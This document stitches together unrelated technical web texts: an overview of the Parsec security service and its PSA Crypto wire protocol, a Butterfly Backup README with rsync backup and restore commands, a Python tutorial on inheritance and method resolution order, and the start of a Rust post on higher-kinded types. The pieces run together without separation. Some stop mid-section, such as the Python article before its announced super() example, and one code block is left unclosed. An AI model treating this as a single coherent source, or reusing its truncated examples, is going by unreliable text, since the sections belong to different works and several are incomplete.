<p>The PSA Crypto API is defined in the C language. Parsec adopts the operations and contracts of the C
API, and uses them as the basis for a language-independent <a href="https://parallaxsecond.github.io/parsec-book/parsec_client/wire_protocol.html"><strong>wire
protocol</strong></a>. Each <a href="https://parallaxsecond.github.io/parsec-book/parsec_client/operations">operation</a> is defined,
along with all of its inputs and outputs, as a serializable contract, making it suitable to be
invoked over an Inter-Process Communication (IPC) transport. Parsec maintains functional equivalence
with the PSA Crypto API, but allows for out-of-process callers in any programming language.</p>

<p>The core component of Parsec is the <strong>security service</strong> (or <strong>security daemon</strong>). This is a
background process that runs on the host platform and provides connectivity with the secure
facilities of that host and surfaces the wire protocol based on PSA Crypto.</p>
<p>The security service listens on a suitable transport medium. The transport technology is one of
Parsec's many pluggable components, and no single transport is mandated. Choice of transport is
dependent on the operating system and the deployment. On Linux-based systems where the client
applications are running in containers (isolation with a shared kernel), the transport can be based
on Unix sockets.</p>
<p>Client applications make connections with the service by posting API requests to the transport
endpoint. This is usually done via a client library that hides the details of both the wire protocol
and the transport. This is one of the ways in which the client library simplifies the experience of
Parsec for application developers.</p>
<p>A single instance of the Parsec service executes on each physical host. In virtualized environments,
the Parsec service may reside on a specially-assigned guest, or potentially within the hypervisor.</p>
<p>The security service does not support remote client applications. Each physical host or node must
have its own instance of the service. However, it is possible for the service to initiate outbound
remote calls of other services, such as cloud-hosted HSM services.</p>

<p>In addition to surfacing the common API, the Parsec service is also responsible for brokering access
to the underlying security facilities amongst the multiple client applications. The exact way that
this is done will vary from one deployment to another. (See the section below on pluggable back-end
modules). Some of the brokering functionality may already reside in kernel drivers and other parts
of the software stack. The Parsec service is responsible for creating isolated views of key storage
and cryptographic services for each client application. The secure assets of one client must be kept
protected from those of another.</p>
<p>Central to this multi-tenant operation is the notion of <strong>application identity</strong> and the need for a
separate <strong>identity provider</strong> service. A Parsec-enabled host must contain an identity provider
service in addition to the Parsec service itself.</p>
<p>For more information about application identities and the identity provider, please refer to the
<a href="https://parallaxsecond.github.io/parsec-book/parsec_service/system_architecture.html"><strong>system architecture</strong></a> document.</p>

<p>The Parsec service employs a layered architecture, structured into a front-end and a back-end.</p>
<p>The front-end module provides the transport endpoint and listens for connections from clients. The
front-end understands the wire protocol and the common API. It is responsible for serialization and
de-serialization of the operation contracts.</p>
<p>The back-end modules are known as <strong>providers</strong>. An instance of the Parsec security service can load
one or more providers. Providers implement the API operations using platform-specific or
vendor-specific code. They provide the "last mile" of connectivity down to the underlying hardware,
software or firmware.</p>
<p>For a deeper dive into the modular structure of the Parsec service, please take a look at the
<a href="https://parallaxsecond.github.io/parsec-book/parsec_service/interfaces_and_dataflow.html"><strong>interfaces and dataflow</strong></a> design document.</p>
<p>Then delve into the <a href="https://parallaxsecond.github.io/parsec-book/parsec_service/source_code_structure.html"><strong>source code</strong></a> to discover the
back-end provider modules that exist. If you cannot find one that is compatible with the platform
you intend to use, then please consider contributing a new provider.</p>

<p>A key aim of Parsec is to evolve an ecosystem of developer-friendly client libraries in multiple
programming languages.</p>

<p><strong>The plan is great when the backup plan is excellent!</strong></p>

<h2 id="what-is-that">What is that?</h2>
<p>Butterfly Backup is a <em>simple</em> command line wrapper of rsync for <em>complex</em> task, written in python.</p>

<h2 id="why-butterfly">Why butterfly?</h2>
<p>Butterfly Backup exploits the potential of rsync with maximum simplicity, maximum flexibility and more. Moreover,
its greatest strength is the organization of backups in a catalog, easy to consult.</p>

<h2 id="what-can-i-do">What can I do?</h2>
<p>With Butterfly Backup I can perform single or group backups (Full, Incremental, Differential and Mirror), restore, export, list and archive old backups.</p>

<h2 id="how-can-you-do-it">How can you do it?</h2>
<p>Naturally through the synergy of rsync and OpenSSH technology and the power of Python..</p>

<h2 id="which-platforms-support">Which platforms support?</h2>
<p>Butterfly Backup can backup Linux, BSD, MacOSX and Windows(with cygwin, see <a href="https://butterfly-backup.readthedocs.io/en/latest/">config docs</a>)</p>

<h2 id="real-uses">Real uses</h2>
<p>This list consists of only a few examples; applications can be endless:</p>
<ul>
  <li>Backing up periodically (ex. once a month) a folder where I store my photos over the years;</li>
  <li>Log’s backup of one or more servers;</li>
  <li>Backup of users of one or more machines;</li>
  <li>Backup system config of much servers;</li>
  <li>Create a backup snapshot of the my laptop;</li>
  <li>Create a central server than backupping client and server;</li>
  <li>Backup a entire file server, incrementally;</li>
</ul>

<h2 id="real-possibilities">Real possibilities</h2>
<ul>
  <li>Configuration for silently or bulk backup</li>
  <li>All backup are organized into a catalog</li>
  <li>List single or all backup by the catalog</li>
  <li>List detail of a single backup</li>
  <li>Backup single PC, with Full,Incremental,Differential and Mirror mode;</li>
  <li>Backup more PCs, with Full,Incremental,Differential and Mirror mode (with parallelism algorithm);</li>
  <li>Backup custom folder or predefined data (User,Config,Application,System,Log): see <a href="https://butterfly-backup.readthedocs.io/en/latest/#backup">backup docs</a></li>
  <li>Restore backup on the same PC</li>
  <li>Restore backup in other PC</li>
  <li>Restore backup in other operating system</li>
  <li>Apply retention policy to delete old backup</li>
  <li>Archive old backup in other file system or same (zip backup folder)</li>
  <li>Export one backup to another file system</li>
</ul>


<p><strong>Transform rsync in a powerfully backup/restore/archive tool</strong></p>

<h2 id="operation">Operation</h2>
<p>All operation of Butterfly Backup are <em>server to client</em>, agent-less. The server must be Unix machine with latest rsync installed.
This means that all commands must be executed by the backup server. Of course, nothing prevents the backup server from being itself (localhost).</p>

<p>To see all the operations and more examples, see the <a href="https://butterfly-backup.readthedocs.io/en/latest/">docs</a>.</p>

<h2 id="test">Test</h2>
<p>If you want to try or test Butterfly Backup before installing it, run the test:</p>
<div><div><pre><code><span>$</span><span> </span>git clone https://github.com/MatteoGuadrini/Butterfly-Backup.git
<span>$</span><span> </span><span>cd </span>Butterfly-Backup
<span>$</span><span> </span>bash test_bb.py
<span>...
</span><span>[92512a6e-506e-11eb-b747-2ba55b805ea5]
type = Full
path = /tmp/bb_repo/localhost/2021_01_06__23_28
name = localhost
os = Unix
timestamp = 2021-01-06 23:28:59
start = 2021-01-06 23:28:59
end = 2021-01-06 23:29:04
status = 0
</span></code></pre></div></div>

<h2 id="installation">Installation</h2>
<p>Install Butterfly Backup is very simple; run this:</p>
<div><div><pre><code>git clone https://github.com/MatteoGuadrini/Butterfly-Backup.git
<span>cd </span>Butterfly-Backup
<span>sudo </span>python3 setup.py
bb <span>--help</span>
man bb
</code></pre></div></div>

<h3 id="backup-machine">Backup machine</h3>
<p>Backup a single PC or server is a everyday task.
But most of the data may not change in the various backups made;
then, in these cases, an incremental backup is needed.
Butterfly Backup natively supports incremental and differential backups, starting from a full.
In this case, the first backup to be performed on the machine will be as follows:</p>
<div><div><pre><code>bb backup <span>--computer</span> pc1 <span>--destination</span> /nas/mybackup <span>--data</span> User Config <span>--type</span> MacOS <span>--mode</span> Full
</code></pre></div></div>
<p>or with short option:</p>
<div><div><pre><code>bb backup <span>-c</span> pc1 <span>-d</span> /nas/mybackup <span>-D</span> User Config <span>-t</span> MacOS <span>-m</span> Full
</code></pre></div></div>
<p>So we created a first <em>Full</em> backup, on a <em>MacOS</em> machine, considering the folders <em>User</em> -&gt; /Users and <em>Config</em> -&gt; /private/etc in the destination <em>/nas/mybackup</em></p>
<blockquote>
  <p><strong>Note</strong>: if you do not specify the user, Butterfly Backup will assume that the source and the destination know the same user; for example, I start the backup with the above command and my user is calling <em>arthur</em>, he will use the latter to log in to pc1.</p>
</blockquote>

<p>Now that we have our first Full backup, we can run <em>incremental</em> for the next few times.</p>
<div><div><pre><code>bb backup <span>--computer</span> pc1 <span>--destination</span> /nas/mybackup <span>--data</span> User Config <span>--type</span> MacOS
</code></pre></div></div>
<p>or with short option:</p>
<div><div><pre><code>bb backup <span>-c</span> pc1 <span>-d</span> /nas/mybackup <span>-D</span> User Config <span>-t</span> MacOS

<h3 id="restore-machine">Restore machine</h3>
<p>Before starting any restore, you need to understand what kind of data and in what time period you have to start.
So, let’s start checking our backups, with this command:</p>
<div><div><pre><code>bb list <span>--catalog</span> /nas/mybackup
</code></pre></div></div>
<p>The result will be the following:</p>
<div><div><pre><code>BUTTERFLY BACKUP CATALOG

Backup <span>id</span>: f65e5afe-9734-11e8-b0bb-005056a664e0
Hostname or ip: pc1
Timestamp: 2018-08-03 17:50:36

Backup <span>id</span>: 4f2b5f6e-9939-11e8-9ab6-005056a664e0
Hostname or ip: pc1
Timestamp: 2018-08-06 07:26:46

Backup <span>id</span>: cc6e2744-9944-11e8-b82a-005056a664e0
Hostname or ip: pc1
Timestamp: 2018-08-06 08:49:00
</code></pre></div></div>
<p>Select (copy) <em>Backup id</em> when you want restore a backup.
For exit, press <code>q</code>
Now, run this command for more detail (for example, try the first):</p>
<div><div><pre><code>bb list <span>--catalog</span> /nas/mybackup <span>--backup-id</span> f65e5afe-9734-11e8-b0bb-005056a664e0
</code></pre></div></div>
<p>The result will be the following:</p>
<div><div><pre><code>Backup <span>id</span>: f65e5afe-9734-11e8-b0bb-005056a664e0
Hostname or ip: pc1
Type: Full
Timestamp: 2018-08-03 17:50:36
Start: 2018-08-03 17:50:36
Finish: 2018-08-03 18:02:32
OS: MacOS
ExitCode: 0
Path: /nas/mybackup/pc1/2018_08_03__17_50
List: etc
Users
</code></pre></div></div>
<p>Now that we are sure that the selected backup is what we want (both in data and on date), run this command:</p>
<div><div><pre><code>bb restore <span>--computer</span> pc1 <span>--catalog</span> /nas/mybackup <span>--backup-id</span> f65e5afe-9734-11e8-b0bb-005056a664e0
</code></pre></div></div>
<p>So we have restored the data saved on the date indicated in our <em>pc1</em>.</p>

<p>With Butterfly Backup, you can perform Full, Incremental and Mirror backups, applying retention or archive rules;
you can activate the log function, so as to track any operation over time and/or increase verbosity.
Bulk backup operations can be performed using a simple text file, formatted in a list.
Is possible create, by means of openssh operations, a configuration and copy them into the machines impacted by the backup without causing the machine to request the password (key exchange).

  <p>Inheritance is an object oriented feature which allows us to reuse logic by defining parent classes that pass on certain behavior to subclasses.</p>

<p>In this article, we’ll cover some examples of inheritance with Python, the use of the <code>super()</code> function, and some practical examples of inheritance through the use of mixins. The focus will be more on understanding the complexities of multiple inheritance.</p>

<h3 id="inheritance-101-">Inheritance 101 👨‍👩‍👧‍👦</h3>
<p>Subclasses inherit all attributes and methods from a parent class if they don’t override them directly.</p>

<figure><pre><code data-lang="python"><span>class</span> <span>Person</span><span>:</span>
    <span>def</span> <span>__init__</span><span>(</span><span>self</span><span>,</span> <span>name</span><span>):</span>
        <span>self</span><span>.</span><span>name</span> <span>=</span> <span>name</span>

    <span>def</span> <span>intro</span><span>(</span><span>self</span><span>):</span>
        <span>return</span> <span>f</span><span>'Hi I</span><span>\'</span><span>m </span><span>{</span><span>self</span><span>.</span><span>name</span><span>}</span><span>!'</span>


<span>class</span> <span>Employee</span><span>(</span><span>Person</span><span>):</span>
    <span>pass</span></code></pre></figure>

<p>In this example any Employee instance will have a <code>name</code> attribute and an <code>intro</code> method attached to it. Why? Because when we create an Employee instance, it doesn’t define its own <code>__init__</code> or <code>intro</code> methods, so it uses its parents’.</p>

<figure><pre><code data-lang="python"><span>&gt;&gt;&gt;</span> <span>e</span> <span>=</span> <span>Employee</span><span>(</span><span>'Sangeeta'</span><span>)</span>
<span>&gt;&gt;&gt;</span> <span>e</span>
<span>&lt;</span><span>__main__</span><span>.</span><span>Employee</span> <span>object</span> <span>at</span> <span>0x100774520</span><span>&gt;</span>
<span>&gt;&gt;&gt;</span> <span>e</span><span>.</span><span>name</span>
<span>'Sangeeta'</span>
<span>&gt;&gt;&gt;</span> <span>e</span><span>.</span><span>intro</span>
<span>&lt;</span><span>bound</span> <span>method</span> <span>Person</span><span>.</span><span>intro</span> <span>of</span> <span>&lt;</span><span>__main__</span><span>.</span><span>Employee</span> <span>object</span> <span>at</span> <span>0x100774520</span><span>&gt;&gt;</span>
<span>&gt;&gt;&gt;</span> <span>e</span><span>.</span><span>intro</span><span>()</span>
<span>"Hi I'm Sangeeta!"</span></code></pre></figure>

<hr>

<p>If we <em>did</em> define an empty <code>__init__</code> method on Employee, then the Person’s <code>__init__</code> method will never get called, and Employee will never inherit the <code>name</code> attribute from Person.</p>

<figure><pre><code data-lang="python"><span>class</span> <span>Person</span><span>:</span>
    <span>def</span> <span>__init__</span><span>(</span><span>self</span><span>,</span> <span>name</span><span>):</span>
        <span>self</span><span>.</span><span>name</span> <span>=</span> <span>name</span>

    <span>def</span> <span>intro</span><span>(</span><span>self</span><span>):</span>
        <span>return</span> <span>f</span><span>'Hi I</span><span>\'</span><span>m </span><span>{</span><span>self</span><span>.</span><span>name</span><span>}</span><span>!'</span>


<span>class</span> <span>Employee</span><span>(</span><span>Person</span><span>):</span>
    <span>def</span> <span>__init__</span><span>(</span><span>self</span><span>):</span>
        <span>pass</span></code></pre></figure>

<p>When we create an Employee instance, we still have access to Person’s <code>intro</code> method, so technically we can set a <code>name</code> attribute afterwards and call <code>intro</code> successfully.</p>

<figure><pre><code data-lang="shell"><span>&gt;&gt;&gt;</span> e <span>=</span> Employee<span>()</span>
<span>&gt;&gt;&gt;</span> e
&lt;__main__.Employee object at 0x109bd7640&gt;
<span>&gt;&gt;&gt;</span> e.intro
&lt;bound method Person.intro of &lt;__main__.Employee object at 0x109bd7640&gt;&gt;
<span>&gt;&gt;&gt;</span> e.intro<span>()</span>
Traceback <span>(</span>most recent call last<span>)</span>:
  File <span>"&lt;stdin&gt;"</span>, line 1, <span>in</span> &lt;module&gt;
  File <span>"/Users/sangeeta/Code/pystuff/super.py"</span>, line 111, <span>in </span>intro
    <span>return </span>f<span>'Hi I\'</span>m <span>{</span>self.name<span>}!</span><span>'
AttributeError: '</span>Employee<span>' object has no attribute '</span>name<span>'
&gt;&gt;&gt;
&gt;&gt;&gt; e.name = '</span>Sangeeta<span>'   # Finally setting a name attribute
&gt;&gt;&gt; e.intro()
"Hi I'</span>m Sangeeta!<span>"</span></code></pre></figure>

<hr>

<blockquote>The parent class attributes and methods are inherited by default if they are not explicitly defined in the subclass</blockquote>
<p>Let’s drive this point home with another example, whereby both Person and Employee’s <code>__init__</code> set the same <code>name</code> attribute, but this time the Person’s <code>name</code> attribute is uppercased.</p>

<figure><pre><code data-lang="python"><span>class</span> <span>Person</span><span>:</span>
    <span>def</span> <span>__init__</span><span>(</span><span>self</span><span>,</span> <span>name</span><span>):</span>
        <span>self</span><span>.</span><span>name</span> <span>=</span> <span>name</span><span>.</span><span>upper</span><span>()</span>

    <span>def</span> <span>intro</span><span>(</span><span>self</span><span>):</span>
        <span>return</span> <span>f</span><span>'Hi I</span><span>\'</span><span>m </span><span>{</span><span>self</span><span>.</span><span>name</span><span>}</span><span>!'</span>


<span>class</span> <span>Employee</span><span>(</span><span>Person</span><span>):</span>
    <span>def</span> <span>__init__</span><span>(</span><span>self</span><span>,</span> <span>name</span><span>):</span>
        <span>self</span><span>.</span><span>name</span> <span>=</span> <span>name</span></code></pre></figure>

<p>Our Employee class uses its own <code>name</code> attribute, not the Person’s <code>name</code> attribute.</p>

<figure><pre><code data-lang="shell"><span>&gt;&gt;&gt;</span> e <span>=</span> Employee<span>(</span><span>'Sangeeta'</span><span>)</span>
<span>&gt;&gt;&gt;</span> e
&lt;__main__.Employee object at 0x101a3b640&gt;
<span>&gt;&gt;&gt;</span> e.name
<span>'Sangeeta'</span>
<span>&gt;&gt;&gt;</span> e.intro<span>()</span>
<span>"Hi I'm Sangeeta!"</span>
<span>&gt;&gt;&gt;</span>
<span>&gt;&gt;&gt;</span>
<span>&gt;&gt;&gt;</span> p <span>=</span> Person<span>(</span><span>'Sangeeta'</span><span>)</span>
<span>&gt;&gt;&gt;</span> p
&lt;__main__.Person object at 0x101a3b700&gt;
<span>&gt;&gt;&gt;</span> p.name
<span>'SANGEETA'</span>
<span>&gt;&gt;&gt;</span> p.intro<span>()</span>
<span>"Hi I'm SANGEETA!"</span></code></pre></figure>

<h3 id="multiple-inheritance-">Multiple Inheritance 🥞</h3>
<p>When a class inherits from multiple classes, its behavior is directly determined by the order of parent classes in the class definition. Let’s take a look at an example first:</p>

<figure><pre><code data-lang="python"><span>class</span> <span>Person</span><span>:</span>
    <span>def</span> <span>__init__</span><span>(</span><span>self</span><span>,</span> <span>name</span><span>):</span>
        <span>self</span><span>.</span><span>name</span> <span>=</span> <span>name</span>

    <span>def</span> <span>intro</span><span>(</span><span>self</span><span>):</span>
        <span>return</span> <span>f</span><span>'Hi I</span><span>\'</span><span>m </span><span>{</span><span>self</span><span>.</span><span>name</span><span>}</span><span>!'</span>


<span>class</span> <span>Pythonista</span><span>:</span>
    <span>def</span> <span>__init__</span><span>(</span><span>self</span><span>,</span> <span>name</span><span>):</span>
        <span>self</span><span>.</span><span>name</span> <span>=</span> <span>name</span>

    <span>def</span> <span>intro</span><span>(</span><span>self</span><span>):</span>
        <span>return</span> <span>f</span><span>'Hi I</span><span>\'</span><span>m </span><span>{</span><span>self</span><span>.</span><span>name</span><span>}</span><span> and I love Python!'</span>


<span>class</span> <span>Employee</span><span>(</span><span>Person</span><span>,</span> <span>Pythonista</span><span>):</span>
    <span>pass</span></code></pre></figure>

<p>In this example, a call to Employee’s <code>intro</code> method will call the Person’s <code>intro</code> method because it is the first class of the inheritance chain (from left to right) that has an <code>intro</code> method defined. The golden rule is</p>
<blockquote>
If a method is called, Python will look for that method in the class. If it doesn't find it, it will look in the next class listed in this fancy thing called the MRO until it finds it. If it doesn't find it in that chain, it will raise an AttributeError.
</blockquote>
<p>In this example, Pythonista’s methods will actually never be used since Person defines the same methods as Pythonista. In other words, any call to an Employee instance’s <code>__init__</code> and <code>intro</code> will always refer to the Person class.</p>

<h3 id="mro-omg-wtf-">MRO OMG WTF 😳</h3>
<p>A big part of the inheritance picture for me was understanding that inheritance is always in the context of the MRO. In fact, all the examples we’ve seen so far have been making use of MRO, but now lets take a closer look at what it is and how it works in more complex examples.</p>

<p>In our Employee example, the order of parent classes in the class definition defines the order in which method resolution happens. This is precisely MRO – Method Resolution Order – a list that Python constructs to figure our which parent class to use to lookup a method!</p>

<figure><pre><code data-lang="python"><span>class</span> <span>Person</span><span>:</span>
    <span>pass</span>


<span>class</span> <span>Pythonista</span><span>:</span>
    <span>pass</span>


<span>class</span> <span>Employee</span><span>(</span><span>Person</span><span>,</span> <span>Pythonista</span><span>):</span>
    <span>pass</span></code></pre></figure>

<figure><pre><code data-lang="shell"><span>&gt;&gt;&gt;</span> Employee.mro<span>()</span>
<span>[</span>&lt;class <span>'__main__.Employee'</span><span>&gt;</span>, &lt;class <span>'__main__.Person'</span><span>&gt;</span>, &lt;class <span>'__main__.Pythonista'</span><span>&gt;</span>, &lt;class <span>'object'</span><span>&gt;]</span></code></pre></figure>

<p>💡 <em>Bonus tip</em>: Since we are using Python3 for these examples, the Person and Pythonista implicitly inherit from <code>object</code>, so in fact <code>class Person: pass</code> is the same as <code>class Person(object): pass</code>.</p>

<p>There are some intricacies in how the MRO is created. What if Person and Pythonista both inherited from other classes? Let’s look at a different example:</p>

<figure><pre><code data-lang="python"><span>class</span> <span>Human</span><span>:</span>
    <span>pass</span>


<span>class</span> <span>Person</span><span>(</span><span>Human</span><span>):</span>
    <span>pass</span>


<span>class</span> <span>Programmer</span><span>:</span>
    <span>pass</span>


<span>class</span> <span>Pythonista</span><span>(</span><span>Programmer</span><span>):</span>
    <span>pass</span>


<span>class</span> <span>Employee</span><span>(</span><span>Person</span><span>,</span> <span>Pythonista</span><span>):</span>
    <span>pass</span></code></pre></figure>

<figure><pre><code data-lang="shell"><span>&gt;&gt;&gt;</span> Employee.mro<span>()</span>
<span>[</span>&lt;class <span>'__main__.Employee'</span><span>&gt;</span>, &lt;class <span>'__main__.Person'</span><span>&gt;</span>, &lt;class <span>'__main__.Human'</span><span>&gt;</span>, &lt;class <span>'__main__.Pythonista'</span><span>&gt;</span>, &lt;class <span>'__main__.Programmer'</span><span>&gt;</span>, &lt;class <span>'object'</span><span>&gt;]</span></code></pre></figure>

<p>When constructing the MRO, Python uses an algorithm called the <a href="https://en.wikipedia.org/wiki/C3_linearization" target="_blank">C3 linearization algorithm</a> to go through the inheritance chain of each parent class and condense the entire list in a way that conforms to certain constraints. The rule of thumb is that ordering should occur from the most specific class listed down to its parents, and child classes must precede their parents.</p>

<p>Below shows how Employee’s MRO is constructed from the example above:</p>

<p><img src="https://sangeeta.io/images/python-inheritance-example1.gif" alt="Employee inheritance example 1"></p>


<p>As we can see, <code>object</code> (the parent of all classes in Python) appears twice, so following the rule that children precede parents, the rightmost instance of <code>object</code> remains and the other duplicate is removed.</p>

<p>Let’s see another example:</p>

<figure><pre><code data-lang="python"><span>class</span> <span>Human</span><span>:</span>
    <span>pass</span>


<span>class</span> <span>Person</span><span>(</span><span>Human</span><span>):</span>
    <span>pass</span>


<span>class</span> <span>Pythonista</span><span>(</span><span>Human</span><span>):</span>
    <span>pass</span>


<span>class</span> <span>Employee</span><span>(</span><span>Person</span><span>,</span> <span>Pythonista</span><span>):</span>
    <span>pass</span></code></pre></figure>

<p>In this case, both Person and Pythonista inherit from the same parent class, so the MRO for Employee would be formed like this:</p>

<p><img src="https://sangeeta.io/images/python-inheritance-example2.gif" alt="Our Employee inheritance example 2"></p>


<figure><pre><code data-lang="shell"><span>&gt;&gt;&gt;</span> Employee.mro<span>()</span>
<span>[</span>&lt;class <span>'__main__.Employee'</span><span>&gt;</span>, &lt;class <span>'__main__.Person'</span><span>&gt;</span>, &lt;class <span>'__main__.Pythonista'</span><span>&gt;</span>, &lt;class <span>'__main__.Human'</span><span>&gt;</span>, &lt;class <span>'object'</span><span>&gt;]</span></code></pre></figure>

<p>Be mindful that there is a wrong way to inherit, in which Python will throw a nice little TypeError exception at you. Let’s take a look at such a case:</p>

<figure><pre><code data-lang="python"><span>class</span> <span>Human</span><span>:</span>
    <span>pass</span>


<span>class</span> <span>Person</span><span>(</span><span>Human</span><span>):</span>
    <span>pass</span>


<span>class</span> <span>Employee</span><span>(</span><span>Human</span><span>,</span> <span>Person</span><span>):</span>
    <span>pass</span></code></pre></figure>

<p>If we try to create an Employee instance, we get hit with this:</p>

<figure><pre><code data-lang="shell">Traceback <span>(</span>most recent call last<span>)</span>:
  File <span>"/Users/sangeeta/Code/pystuff/super.py"</span>, line 133, <span>in</span> &lt;module&gt;
    class Employee<span>(</span>Human, Person<span>)</span>:
TypeError: Cannot create a consistent method resolution
order <span>(</span>MRO<span>)</span> <span>for </span>bases Human, Person</code></pre></figure>

<p>With the MRO rule that children precede parents, you’d think the MRO would resolve itself but we run into some problems:</p>

<p><img src="https://sangeeta.io/images/python-inheritance-example3.gif" alt="Our Employee inheritance example 3"></p>


<p>The problem is that Human is a direct parent class of Employee so it cannot be thrown to the right just because Person also subclasses from it; it needs to stay there because its a direct parent. This breaks the other constraint that child classes should precede their parents. In this case, Python cannot satisfy all constraints of the MRO, therefore it throws an exception. Refer to this <a href="https://stackoverflow.com/a/42567588" target="_blank">StackOverflow answer</a> for a more detailed answer to this problem.</p>

<p>If you ever come across this, you should probably reconsider your inheritance choices and logic decisions. Fortunately, Python equips us with a powerful function called <code>super</code> to give us the ability to call parent methods within child class methods and create better logic flow when subclassing.</p>

<h3 id="super-duper-super-">super duper super 💥</h3>
<p>Inheritance is great because we inherit functionality from parent classes into our subclasses. As it is, we can either</p>
<ul>
  <li>use parent class methods</li>
  <li>or override methods if we want custom subclass logic</li>
</ul>

<p>But sometimes, in more real world scenarios, we want both! We want to <em>tap into</em> the parent class’s logic and insert that either before or after our custom logic. We can achieve just that with the <code>super</code> function.</p>

<p>Calling <code>super()</code> within a subclass method will lookup the next class in the MRO which has that method defined and call it.</p>

<p>The following example is bit of a no-op illustration of what calling super does. Both implementations of the Employee class behave the same.</p>

  <div itemprop="articleBody">
    <p>Do you want to use Higher Kinded Types (<code>HKT</code>) in Rust? Are you tired of waiting for <code>GAT</code>? Well, this is the place to be.</p>

<p>It’s easiest to understand <code>HKT</code> by analogy. In programming we have many different tiers of abstractions. Starting at the bottom we have <code>term</code>s (aka values) like <code>0</code>, <code>true</code>, <code>"hello world!"</code>. If we want to work with a lot of <code>term</code>s that share a property, we use <code>type</code>s. For example, if we want to work with …</p>

<ul>
  <li>32-bit integer, we use <code>i32</code></li>
  <li>utf-8 strings, we use <code>&amp;str</code> or <code>String</code></li>
</ul>

<p>We generally use snake case to refer to <code>term</code>s generically like <code>x</code>, <code>im_an_integer</code>, and <code>database_connection</code>. We use functions to operate on these generic values.</p>

<div><div><pre><code><span>fn</span> <span>add_one</span><span>(</span>
    <span>// a generic 32-bit integer</span>
    <span>x</span><span>:</span> <span>i32</span>
<span>)</span> <span>-&gt;</span> <span>i32</span> <span>{</span> <span>x</span> <span>+</span> <span>1</span> <span>}</span>
</code></pre></div></div>

<p>Moving up the abstraction tiers, we come to <code>type</code>s. For example: <code>String</code>, <code>i32</code>, or <code>bool</code>. If we want to work with a lot of <code>type</code>s that share a property, we use <code>trait</code>s and generics. For example, if we want to work with …</p>

<ul>
  <li>types that can be debug printed, we use <code>std::fmt::Debug</code></li>
  <li>types that can be iterated, we use <code>Iterator</code></li>
</ul>

<p>We generally use pascal case to refer to <code>types</code>s generically like <code>T</code>, <code>Self</code>, and <code>This</code>. We use generic functions to work with these generic types.</p>

<div><div><pre><code><span>fn</span> <span>print</span><span>&lt;</span><span>T</span><span>:</span> <span>Debug</span><span>&gt;</span><span>(</span><span>x</span><span>:</span> <span>T</span><span>)</span> <span>{</span>
    <span>println!</span><span>(</span><span>"{:?}"</span><span>,</span> <span>x</span><span>);</span>
<span>}</span>
</code></pre></div></div>

<p>Moving up the abstraction tiers again, we come to <code>kind</code>s. For example: <code>Option</code>, <code>Result</code>, or <code>Vec</code>. Wait what. Let’s take a step back. Before I mentioned that <code>String</code>, <code>i32</code>, and <code>bool</code> are types. We also have more types that we can use, generic types like <code>Option&lt;i32&gt;</code> or <code>Result&lt;String, String&gt;</code>. What if you want to generalize over these types? Something of the form <code>T&lt;U&gt;</code>. That’s where we get to kinds. For example:</p>

<ul>
  <li><code>i32</code> has the kind <code>Type</code></li>
  <li><code>Option&lt;i32&gt;</code> has the kind <code>Type</code></li>
  <li><code>'a</code> has the kind <code>Lifetime</code></li>
  <li><code>Option</code> has the kind <code>Type -&gt; Type</code>
    <ul>
      <li>W H A T, let’s stop and explain what’s going on here</li>
    </ul>
  </li>
</ul>

<p>Generic types can be represented as a function from kinds to kinds. For example, <code>Option</code> is a function that takes a <code>Type</code> and produces a <code>Type</code> (hence <code>Type -&gt; Type</code>). Let’s see some more examples:</p>

<ul>
  <li><code>Result</code> has the kind <code>Type -&gt; Type -&gt; Type</code>
    <ul>
      <li>I’ll use this notation because that’s how it’s done in the literature</li>
      <li>Note: this is equivalent to <code>(Type, Type) -&gt; Type</code> (you can always transform a function that take a tuple of arguments into one that takes multiple arguments, and vice versa)</li>
    </ul>
  </li>
  <li>references have a kind <code>Lifetime -&gt; Type -&gt; Type</code>
    <ul>
      <li><code>&amp;'a T</code>, one lifetime and one type parameter :)</li>
    </ul>
  </li>
  <li>arrays have the kind <code>Type -&gt; usize -&gt; Type</code>
    <ul>
      <li><code>[T; len]</code>, one type and one <code>usize</code> <code>term</code> (getting close to dependent types, something we won’t touch in this post)</li>
    </ul>
  </li>
</ul>

<p>With this notion of <code>kind</code>s we are now well equipped to generalize over generics. Just one cinch, <code>Rust</code> doesn’t know about <code>kind</code>s! So how do we generalize over generics if we can’t even express the fundamental building blocks.</p>



<p>The key insight is that we can represent <code>kind</code>s as a system of types and traits. For example, here’s how to handle <code>Type -&gt; Type</code> kinds.</p>

<p>Note: I’ll show how <code>Option</code> fits in, and introduce <code>Result&lt;_, E&gt;</code>, but I’ll leave the implementation of <code>Vec</code> to you. It’s an interesting puzzle if you are inclined</p>

<div><div><pre><code><span>// `Option` has the kind `Type -&gt; Type`,</span>
<span>// we'll represent it with `OptionFamily`</span>
<span>struct</span> <span>OptionFamily</span><span>;</span>
<span>// `Result` has the kind `Type -&gt; Type -&gt; Type`,</span>
<span>// so we fill in one of the types with a concrete one</span>
<span>struct</span> <span>ResultFamily</span><span>&lt;</span><span>E</span><span>&gt;</span><span>(</span><span>PhantomData</span><span>&lt;</span><span>E</span><span>&gt;</span><span>);</span>

<span>// I'll leave the implementation of `VecFamily` to you</span>

<span>// This trait represents the `kind` `Type -&gt; Type`</span>
<span>pub</span> <span>trait</span> <span>OneTypeParam</span><span>&lt;</span><span>A</span><span>&gt;</span> <span>{</span>
    <span>// This represents the output of the function `Type -&gt; Type`</span>
    <span>// for a specific argument `A`.</span>
    <span>type</span> <span>This</span><span>;</span>
<span>}</span>

<span>impl</span><span>&lt;</span><span>A</span><span>&gt;</span> <span>OneTypeParam</span><span>&lt;</span><span>A</span><span>&gt;</span> <span>for</span> <span>OptionFamily</span> <span>{</span>
    <span>// `OptionFamily` represents `Type -&gt; Type`,</span>
    <span>// so filling in the first argument means</span>
    <span>// `Option&lt;A&gt;`</span>
    <span>type</span> <span>This</span> <span>=</span> <span>Option</span><span>&lt;</span><span>A</span><span>&gt;</span><span>;</span>
<span>}</span>

<span>impl</span><span>&lt;</span><span>A</span><span>,</span> <span>E</span><span>&gt;</span> <span>OneTypeParam</span><span>&lt;</span><span>A</span><span>&gt;</span> <span>for</span> <span>ResultFamily</span><span>&lt;</span><span>E</span><span>&gt;</span> <span>{</span>
    <span>// note how all results in this family have `E` as the error type</span>
    <span>// This is similar to how currying works in functional languages</span>
    <span>type</span> <span>This</span> <span>=</span> <span>Result</span><span>&lt;</span><span>A</span><span>,</span> <span>E</span><span>&gt;</span><span>;</span>
<span>}</span>
</code></pre></div></div>

<p>Note how a <code>trait</code> can act as a function over types, so you can encode the idea <code>Type -&gt; Type</code> using a trait!</p>

